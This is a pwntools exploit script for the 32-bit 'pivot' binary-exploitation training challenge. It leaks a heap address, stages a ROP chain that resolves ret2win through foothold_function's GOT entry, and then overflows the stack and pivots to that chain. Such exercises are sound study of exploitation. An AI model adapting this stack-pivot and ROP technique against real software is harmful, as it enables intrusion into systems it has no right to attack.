from pwn import *
import re

elf = ELF('pivot32',checksec=False)
elf_so = ELF('libpivot32.so',checksec=False)

p = process(elf.path)

heap_addr = int(re.search(r"0x.*?\b", p.recvuntil("> ")).group(), 16)



pop_eax = 0x080488c0 # 0x080488c0 : pop eax ; ret
mov_eax = 0x080488c4 # 0x080488c4 : mov eax, dword ptr [eax] ; ret
pop_ebx = 0x08048571 # 0x08048571 : pop ebx ; ret
add_eax_ebx = 0x080488c7  # 0x080488c7 : add eax, ebx ; ret
call_eax = 0x080486a3 # 0x080486a3 : call eax
xchg_eax_esp = 0x080488c2

foot_plt = elf.symbols['foothold_function']
foot_got = elf.got['foothold_function']

offset = elf_so.symbols['ret2win'] - elf_so.symbols['foothold_function']


payload1 = p32(foot_plt)
payload1 += p32(pop_eax) + p32(foot_got)
payload1 += p32(mov_eax)
payload1 += p32(pop_ebx) + p32(offset)
payload1 += p32(add_eax_ebx)
payload1 += p32(call_eax)

p.sendline(payload1)

p.recvuntil("> ")

payload2 = cyclic(44)
payload2 += p32(pop_eax) + p32(heap_addr)
payload2 += p32(xchg_eax_esp)

p.sendline(payload2)

p.interactive()


